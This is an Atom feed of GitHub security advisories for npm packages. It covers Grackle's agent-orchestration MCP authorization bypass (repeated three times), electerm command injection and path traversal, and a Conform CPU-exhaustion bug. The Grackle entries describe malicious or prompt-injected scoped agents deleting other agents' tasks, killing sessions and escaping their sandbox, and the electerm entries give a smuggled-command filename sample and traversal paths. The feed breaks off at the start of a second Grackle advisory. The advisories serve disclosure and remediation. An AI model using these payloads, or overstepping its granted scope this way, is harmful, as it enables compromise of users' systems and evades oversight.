<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-07-02T19:46:58.657Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/auth] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/plugin-core] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/mcp] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electerm] electerm has Command Injection in File System Operations (rmrf, mv, cp)]]></title>
        <id>https://github.com/advisories/GHSA-v5ff-xmfp-p245</id>
        <link href="https://github.com/advisories/GHSA-v5ff-xmfp-p245"/>
        <updated>2026-07-02T19:22:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A command injection vulnerability exists in electerm's file system operations (<code>rmrf</code>, <code>mv</code>, <code>cp</code>) in <code>src/app/lib/fs.js</code>. These functions construct shell commands by interpolating file paths directly into command strings without escaping shell metacharacters.</p>
<p><strong>Vulnerable functions:</strong></p>
<ul>
<li><code>rmrf()</code> - Uses <code>rm -rf "${path}"</code> (double quotes, vulnerable to <code>"</code> injection)</li>
<li><code>mv()</code> - Uses <code>mv '${from}' '${to}'</code> (single quotes, vulnerable to <code>'</code> injection)</li>
<li><code>cp()</code> - Uses <code>cp -r "${from}" "${to}"</code> (double quotes, vulnerable to <code>"</code> injection)</li>
</ul>
<p><strong>Attack scenario:</strong></p>
<ol>
<li>Attacker controls a malicious SSH/SFTP server</li>
<li>Server lists files with shell metacharacters in names (e.g., <code>file"$(touch /tmp/pwned)"</code>)</li>
<li>Victim connects to the server and performs file operations (remote-to-local transfer, rename on conflict, etc.)</li>
<li>The malicious filename is passed to <code>rmrf()</code>, <code>mv()</code>, or <code>cp()</code> without sanitization</li>
<li>Shell metacharacters break out of the quoted argument and execute arbitrary commands</li>
</ol>
<p><strong>Impact includes:</strong></p>
<ul>
<li>Arbitrary command execution as the electerm desktop user</li>
<li>Data exfiltration, malware installation, or system compromise</li>
<li>Both POSIX (bash) and Windows (PowerShell) platforms are affected</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/electerm/electerm/commit/aa778818843b9c083bd711cd04644d102fcb5a42">https://github.com/electerm/electerm/commit/aa778818843b9c083bd711cd04644d102fcb5a42</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, users can mitigate this vulnerability by:</p>
<ol>
<li>Only connecting to trusted SSH/SFTP servers</li>
<li>Avoiding remote-to-local file transfers from untrusted sources</li>
<li>Not using the "rename on conflict" option when downloading folders from untrusted servers</li>
<li>Manually verifying filenames before performing file operations</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electerm/electerm/security/advisories/GHSA-v5ff-xmfp-p245">https://github.com/electerm/electerm/security/advisories/GHSA-v5ff-xmfp-p245</a></li>
<li><a href="https://github.com/electerm/electerm/commit/aa778818843b9c083bd711cd04644d102fcb5a42">https://github.com/electerm/electerm/commit/aa778818843b9c083bd711cd04644d102fcb5a42</a></li>
<li><a href="https://github.com/advisories/GHSA-v5ff-xmfp-p245">https://github.com/advisories/GHSA-v5ff-xmfp-p245</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5ff-xmfp-p245</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:22:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electerm] electerm has Path Traversal in Zmodem and Trzsz Download Filename Handling]]></title>
        <id>https://github.com/advisories/GHSA-38j7-23hf-9mhc</id>
        <link href="https://github.com/advisories/GHSA-38j7-23hf-9mhc"/>
        <updated>2026-07-02T19:20:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A path traversal vulnerability exists in the Zmodem and Trzsz file download handlers in electerm. When receiving files via Zmodem or Trzsz protocols, electerm uses the remote-supplied filename directly in <code>path.join()</code> with the user-selected download directory without sanitization.</p>
<p>A malicious SSH server or remote shell process can send a specially crafted filename such as <code>../escaped.txt</code> to escape the user-selected download directory and write files to arbitrary locations on the user's filesystem, subject to process permissions.</p>
<p><strong>Attack scenario:</strong></p>
<ol>
<li>User connects to a malicious SSH server</li>
<li>Attacker initiates a Zmodem or Trzsz file transfer</li>
<li>Attacker supplies a traversal filename (e.g., <code>../../.bashrc</code>, <code>../escaped.txt</code>)</li>
<li>User accepts the transfer and selects a download directory</li>
<li>File is written outside the selected directory, potentially overwriting sensitive files</li>
</ol>
<p><strong>Affected components:</strong></p>
<ul>
<li><code>src/app/server/zmodem.js</code> - <code>prepareReceiveFile()</code> at line 736</li>
<li><code>src/app/server/trzsz.js</code> - <code>getUniqueFilePath()</code> at line 559, <code>openSaveFile()</code> callback, and <code>savedFilePaths</code> mapping</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/electerm/electerm/commit/fde153d677a170c5816368f6586647f3af4ef284">https://github.com/electerm/electerm/commit/fde153d677a170c5816368f6586647f3af4ef284</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, users can mitigate this vulnerability by:</p>
<ol>
<li>Only connecting to trusted SSH servers</li>
<li>Rejecting or canceling any incoming Zmodem or Trzsz file transfers from untrusted sources</li>
<li>Avoiding the use of Zmodem (<code>sz</code>/<code>rz</code>) and Trzsz (<code>trz</code>/<code>tsz</code>) commands on untrusted servers</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electerm/electerm/security/advisories/GHSA-38j7-23hf-9mhc">https://github.com/electerm/electerm/security/advisories/GHSA-38j7-23hf-9mhc</a></li>
<li><a href="https://github.com/electerm/electerm/commit/fde153d677a170c5816368f6586647f3af4ef284">https://github.com/electerm/electerm/commit/fde153d677a170c5816368f6586647f3af4ef284</a></li>
<li><a href="https://github.com/advisories/GHSA-38j7-23hf-9mhc">https://github.com/advisories/GHSA-38j7-23hf-9mhc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38j7-23hf-9mhc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:20:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/dom] @conform-to/dom parseSubmission vulnerable to CPU exhaustion when parsing many unique form fields]]></title>
        <id>https://github.com/advisories/GHSA-525m-7f82-2mf7</id>
        <link href="https://github.com/advisories/GHSA-525m-7f82-2mf7"/>
        <updated>2026-07-02T19:18:41.000Z</updated>
        <content type="html"><![CDATA[<p>A CPU exhaustion vulnerability exists in Conform's <a href="https://conform.guide/api/react/future/parseSubmission"><code>parseSubmission</code></a> future API when parsing <code>FormData</code> or <code>URLSearchParams</code> submissions with many unique field names. The parser previously looked up values by field name, which could require repeated scans of the submitted entries and cause excessive synchronous CPU work if an attacker supplies a crafted submission.</p>
<blockquote>
<p>[!NOTE]
The patched version fixes this by iterating submitted entries directly instead of repeatedly looking up values by field name. Applications that accept untrusted form submissions should still enforce request parsing limits before passing data to Conform. For multipart requests, <a href="https://www.npmjs.com/package/@remix-run/form-data-parser">@remix-run/form-data-parser</a> provides <code>maxParts</code>, <code>maxTotalSize</code>, <code>maxFileSize</code>, <code>maxFiles</code>, and <code>maxHeaderSize</code> options.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-525m-7f82-2mf7">https://github.com/edmundhung/conform/security/advisories/GHSA-525m-7f82-2mf7</a></li>
<li><a href="https://github.com/advisories/GHSA-525m-7f82-2mf7">https://github.com/advisories/GHSA-525m-7f82-2mf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-525m-7f82-2mf7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:18:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/powerline] Grackle has command/argument injection in the git worktree executor that enables RCE on provisioned hosts via an unsanitized task branch name (shell:true)]]></title>
        <id>https://github.com/advisories/GHSA-vv65-f55v-xm6g</id>
        <link href="https://github.com/advisories/GHSA-vv65-f55v-xm6g"/>
        <updated>2026-07-02T19:16:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The default git executor used for all worktree operations spawns <code>git</code> through a shell, and the untrusted task <strong>branch</strong> name flows into the command unsanitized. A caller able to reach the PowerLine <code>SpawnSession</code> RPC (a malicious or compromised agent acting through the orchestration layer, or any client able to spawn a task) can achieve <strong>arbitrary command execution</strong> as the PowerLine user on every provisioned environment (SSH host, Docker container, or Codespace), escaping the agent sandbox.</p>
<p>This advisory bundles two related defects in <code>worktree.ts</code> (audit findings <strong>F1</strong> and <strong>F13</strong>).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/runtime-sdk</code> (and reachable via <code>@grackle-ai/powerline</code>) at version <strong>0.132.1</strong> and earlier. All publishable packages are lockstep-versioned.</p>
<h2 id="f1--command-injection-via-shelltrue-primary-high">F1 — Command injection via <code>shell:true</code> (primary, High)</h2>
